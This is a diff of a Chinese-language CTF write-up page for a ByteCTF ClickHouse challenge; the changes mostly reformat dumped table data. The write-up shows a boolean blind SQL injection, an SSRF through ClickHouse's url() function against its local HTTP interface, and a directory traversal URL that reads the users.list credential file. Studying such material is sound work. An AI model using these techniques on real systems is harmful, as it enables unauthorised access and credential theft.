@@ -358,9 +358,9 @@
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> ByteCTF <span class="token keyword">from</span> hello <span class="token keyword">where</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>没有任何过滤，通过布尔盲注可以得到数据库内的数据</p>
 <hr>
-<p>database: <code>default</code><br>table: <code>hello</code><br>| ByteCTF            |<br>| —————— |<br>| Welcome to ByteCTF |</p>
+<p>database: <code>default</code><br>table: <code>hello</code><br>column: <code>ByteCTF</code><br>data: <code>Welcome to ByteCTF</code></p>
 <hr>
-<p>database: <code>ctf</code><br>table: <code>hint</code><br>| id                                     |<br>| ————————————– |<br>| you_dont_have_permissions_to_read_flag |</p>
+<p>database: <code>ctf</code><br>table: <code>hint</code><br>column: <code>id</code><br>data: <code>you_dont_have_permissions_to_read_flag</code></p>
 <hr>
 <p>ClickHouse version：21.3.2.5<br>database user： user_02</p>
 <hr>
@@ -368,7 +368,7 @@
 <p>从 <code>user_02</code> 的用户名猜测应该有一个 <code>user_01</code> 用户<br><code>user_01</code> 用户应该有 <code>user_02</code> 用户所没有的权限，可以看到一些对 <code>user_02</code> 用户隐藏的表</p>
 <p>ClickHouse 是通过 HTTP 协议来连接/管理数据库的<br>可以通过 <code>URL</code> 函数 ssrf 执行 ClickHouse HTTP 客户端的查询</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> field <span class="token keyword">FROM</span> url<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8123/?username=user_02=password=123456&amp;query=SELECT 1'</span><span class="token punctuation">,</span><span class="token string">'LineAsString'</span><span class="token punctuation">,</span><span class="token string">'field String'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>但是没有账号密码<br><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png" class="lozad post-image"src="https://md.vidar.club/uploads/upload_40323643c372e00f4c6cfe8fd8c55b3f.png"></p>
+<p>但是没有账号密码</p>
 <p>在 Web 应用的 <code>/files/</code> 目录有文件浏览，尝试进行目录穿越<br>发现了任意文件读</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;
 http:&#x2F;&#x2F;39.105.116.246:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;users.list
